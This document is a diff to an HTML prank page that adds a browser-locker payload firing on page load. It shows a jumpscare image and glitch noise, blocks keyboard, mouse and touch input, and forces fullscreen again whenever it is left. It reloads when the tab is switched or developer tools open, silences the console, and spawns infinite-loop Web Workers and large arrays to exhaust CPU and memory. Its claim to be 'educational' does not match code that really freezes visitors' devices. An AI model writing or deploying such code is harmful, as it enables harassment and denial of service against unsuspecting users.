@@ -21,6 +21,17 @@
             text-align: center;
         }
 
+        /* Fullscreen image styling */
+        img {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: 1;
+        }
+
         /* Disable pointer events */
         * {
             pointer-events: none;
@@ -32,207 +43,191 @@
             padding: 20px;
             border-radius: 10px;
             background-color: #222;
-        }
-
-        /* Countdown styling */
-        .countdown {
-            font-size: 24px;
-            margin-top: 20px;
+            z-index: 2;
+            position: relative;
         }
     </style>
 </head>
 <body>
+    <!-- Display the jumpscare image -->
+    <img src="Jumpscare Picture Scary.jpeg" alt="Jumpscare Image">
+
     <div class="warning">
         <h1>⚠️ WARNING ⚠️</h1>
         <p>This is a simulated screen freeze and extreme lag for educational and testing purposes only.</p>
-        <p>Your device will freeze and lag in <span id="countdown">10</span> seconds.</p>
+        <p>Your device is temporarily locked and will experience severe lag.</p>
     </div>
 
     <script>
-        // ==== Countdown Timer ====
-        let countdown = 10;
-        const countdownElement = document.getElementById('countdown');
+        // ==== Glitchy Background Sounds ====
+        function createGlitchSound() {
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioContext.createOscillator();
+            const gainNode = audioContext.createGain();
 
-        const countdownInterval = setInterval(() => {
-            countdown--;
-            countdownElement.textContent = countdown;
+            oscillator.type = 'square'; // Glitchy sound
+            oscillator.frequency.setValueAtTime(440, audioContext.currentTime); // Base frequency
+            gainNode.gain.setValueAtTime(0.5, audioContext.currentTime); // Volume
 
-            if (countdown <= 0) {
-                clearInterval(countdownInterval);
-                activateFreezeAndLag();
+            // Randomly modulate frequency for glitch effect
+            setInterval(() => {
+                oscillator.frequency.setValueAtTime(Math.random() * 1000, audioContext.currentTime);
+            }, 100);
+
+            // Randomly modulate volume for glitch effect
+            setInterval(() => {
+                gainNode.gain.setValueAtTime(Math.random() * 0.5, audioContext.currentTime);
+            }, 50);
+
+            oscillator.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+            oscillator.start();
+        }
+
+        // Start glitchy sounds
+        createGlitchSound();
+
+        // ==== Prevent Mouse Movement ====
+        document.addEventListener('mousemove', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            // Forcefully move the mouse to the center of the screen
+            const centerX = window.innerWidth / 2;
+            const centerY = window.innerHeight / 2;
+            window.moveTo(centerX, centerY);
+        });
+
+        // ==== Disable Keyboard Input ====
+        document.addEventListener('keydown', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+        });
+
+        // ==== Prevent Right-Click ====
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        // ==== Prevent Navigation ====
+        window.onbeforeunload = function() {
+            return "You cannot leave this page.";
+        };
+
+        // ==== Force Fullscreen ====
+        function requestFullscreen() {
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            } else if (document.documentElement.mozRequestFullScreen) { // Firefox
+                document.documentElement.mozRequestFullScreen();
+            } else if (document.documentElement.webkitRequestFullscreen) { // Chrome, Safari, Opera
+                document.documentElement.webkitRequestFullscreen();
+            } else if (document.documentElement.msRequestFullscreen) { // IE/Edge
+                document.documentElement.msRequestFullscreen();
+            }
+        }
+
+        // Request fullscreen on activation
+        requestFullscreen();
+
+        // ==== Prevent Exiting Fullscreen ====
+        document.addEventListener('fullscreenchange', function() {
+            if (!document.fullscreenElement) {
+                requestFullscreen();
+            }
+        });
+
+        // ==== Disable Touch Input (Mobile Devices) ====
+        document.addEventListener('touchstart', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+        });
+
+        document.addEventListener('touchmove', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+        });
+
+        document.addEventListener('touchend', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+        });
+
+        // ==== Disable Pointer Events ====
+        document.addEventListener('pointerdown', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+        });
+
+        document.addEventListener('pointermove', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+        });
+
+        // ==== Prevent Tab Switching ====
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                window.location.reload(); // Reload the page if the user switches tabs
+            }
+        });
+
+        // ==== Continuously Refocus the Window ====
+        window.onblur = function() {
+            window.focus();
+        };
+
+        // ==== Prevent Console Access ====
+        console.log = function() {};
+        console.warn = function() {};
+        console.error = function() {};
+        console.clear();
+
+        // ==== Prevent Developer Tools ====
+        setInterval(function() {
+            if (window.outerWidth - window.innerWidth > 100 || window.outerHeight - window.innerHeight > 100) {
+                window.location.reload(); // Reload the page if the developer tools are opened
             }
         }, 1000);
 
-        // ==== Activate Freeze and Lag After 10 Seconds ====
-        function activateFreezeAndLag() {
-            // ==== Glitchy Background Sounds ====
-            function createGlitchSound() {
-                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = audioContext.createOscillator();
-                const gainNode = audioContext.createGain();
-
-                oscillator.type = 'square'; // Glitchy sound
-                oscillator.frequency.setValueAtTime(440, audioContext.currentTime); // Base frequency
-                gainNode.gain.setValueAtTime(0.5, audioContext.currentTime); // Volume
-
-                // Randomly modulate frequency for glitch effect
-                setInterval(() => {
-                    oscillator.frequency.setValueAtTime(Math.random() * 1000, audioContext.currentTime);
-                }, 100);
-
-                // Randomly modulate volume for glitch effect
-                setInterval(() => {
-                    gainNode.gain.setValueAtTime(Math.random() * 0.5, audioContext.currentTime);
-                }, 50);
-
-                oscillator.connect(gainNode);
-                gainNode.connect(audioContext.destination);
-                oscillator.start();
+        // ==== Induce Extreme Lag (Optimized to Avoid Crashing) ====
+        function induceExtremeLag() {
+            // Create a large array to consume memory (but not too large to crash the browser)
+            const largeArray = [];
+            for (let i = 0; i < 1e6; i++) {
+                largeArray.push(new Array(100).fill('lag'));
             }
 
-            // Start glitchy sounds
-            createGlitchSound();
-
-            // ==== Prevent Mouse Movement ====
-            document.addEventListener('mousemove', function(e) {
-                e.preventDefault();
-                e.stopPropagation();
-                // Forcefully move the mouse to the center of the screen
-                const centerX = window.innerWidth / 2;
-                const centerY = window.innerHeight / 2;
-                window.moveTo(centerX, centerY);
-            });
-
-            // ==== Disable Keyboard Input ====
-            document.addEventListener('keydown', function(e) {
-                e.preventDefault();
-                e.stopPropagation();
-            });
-
-            // ==== Prevent Right-Click ====
-            document.addEventListener('contextmenu', function(e) {
-                e.preventDefault();
-            });
-
-            // ==== Prevent Navigation ====
-            window.onbeforeunload = function() {
-                return "You cannot leave this page.";
-            };
-
-            // ==== Force Fullscreen ====
-            function requestFullscreen() {
-                if (document.documentElement.requestFullscreen) {
-                    document.documentElement.requestFullscreen();
-                } else if (document.documentElement.mozRequestFullScreen) { // Firefox
-                    document.documentElement.mozRequestFullScreen();
-                } else if (document.documentElement.webkitRequestFullscreen) { // Chrome, Safari, Opera
-                    document.documentElement.webkitRequestFullscreen();
-                } else if (document.documentElement.msRequestFullscreen) { // IE/Edge
-                    document.documentElement.msRequestFullscreen();
+            // Continuously perform heavy computations (but with controlled intervals)
+            setInterval(() => {
+                for (let i = 0; i < largeArray.length; i++) {
+                    largeArray[i].sort(() => Math.random() - 0.5);
                 }
-            }
+            }, 100);
 
-            // Request fullscreen on activation
-            requestFullscreen();
+            // Continuously create and remove DOM elements (but with controlled intervals)
+            setInterval(() => {
+                const div = document.createElement('div');
+                div.style.position = 'absolute';
+                div.style.top = Math.random() * window.innerHeight + 'px';
+                div.style.left = Math.random() * window.innerWidth + 'px';
+                div.style.width = '100px';
+                div.style.height = '100px';
+                div.style.backgroundColor = 'red';
+                document.body.appendChild(div);
+                setTimeout(() => div.remove(), 100);
+            }, 100);
 
-            // ==== Prevent Exiting Fullscreen ====
-            document.addEventListener('fullscreenchange', function() {
-                if (!document.fullscreenElement) {
-                    requestFullscreen();
+            // Continuously create Web Workers to overload the CPU (but with controlled intervals)
+            setInterval(() => {
+                for (let i = 0; i < 5; i++) {
+                    const worker = new Worker(URL.createObjectURL(new Blob([`
+                        while (true) {}
+                    `])));
                 }
-            });
-
-            // ==== Disable Touch Input (Mobile Devices) ====
-            document.addEventListener('touchstart', function(e) {
-                e.preventDefault();
-                e.stopPropagation();
-            });
-
-            document.addEventListener('touchmove', function(e) {
-                e.preventDefault();
-                e.stopPropagation();
-            });
-
-            document.addEventListener('touchend', function(e) {
-                e.preventDefault();
-                e.stopPropagation();
-            });
-
-            // ==== Disable Pointer Events ====
-            document.addEventListener('pointerdown', function(e) {
-                e.preventDefault();
-                e.stopPropagation();
-            });
-
-            document.addEventListener('pointermove', function(e) {
-                e.preventDefault();
-                e.stopPropagation();
-            });
-
-            // ==== Prevent Tab Switching ====
-            document.addEventListener('visibilitychange', function() {
-                if (document.hidden) {
-                    window.location.reload(); // Reload the page if the user switches tabs
-                }
-            });
-
-            // ==== Continuously Refocus the Window ====
-            window.onblur = function() {
-                window.focus();
-            };
-
-            // ==== Prevent Console Access ====
-            console.log = function() {};
-            console.warn = function() {};
-            console.error = function() {};
-            console.clear();
-
-            // ==== Prevent Developer Tools ====
-            setInterval(function() {
-                if (window.outerWidth - window.innerWidth > 100 || window.outerHeight - window.innerHeight > 100) {
-                    window.location.reload(); // Reload the page if the developer tools are opened
-                }
-            }, 1000);
-
-            // ==== Induce Extreme Lag (Optimized to Avoid "Aw, Snap!") ====
-            function induceExtremeLag() {
-                // Create a smaller array to avoid excessive memory usage
-                const arraySize = 1e6; // Reduced size to prevent crashes
-                const massiveArray = new Array(arraySize).fill('extreme lag');
-
-                // Continuously perform heavy computations (but with smaller chunks)
-                setInterval(() => {
-                    for (let i = 0; i < arraySize; i++) {
-                        massiveArray.sort(() => Math.random() - 0.5);
-                    }
-                }, 100);
-
-                // Continuously create and remove DOM elements (but with fewer elements)
-                setInterval(() => {
-                    const div = document.createElement('div');
-                    div.style.position = 'absolute';
-                    div.style.top = Math.random() * window.innerHeight + 'px';
-                    div.style.left = Math.random() * window.innerWidth + 'px';
-                    div.style.width = '100px';
-                    div.style.height = '100px';
-                    div.style.backgroundColor = 'red';
-                    document.body.appendChild(div);
-                    setTimeout(() => div.remove(), 100);
-                }, 100);
-
-                // Continuously create Web Workers (but with fewer workers)
-                setInterval(() => {
-                    for (let i = 0; i < 2; i++) { // Reduced number of workers
-                        const worker = new Worker(URL.createObjectURL(new Blob([`
-                            while (true) {}
-                        `])));
-                    }
-                }, 1000);
-            }
-
-            // Start inducing extreme lag
-            induceExtremeLag();
+            }, 5000);
         }
+
+        // Start inducing extreme lag
+        induceExtremeLag();
     </script>
 </body>
 </html>
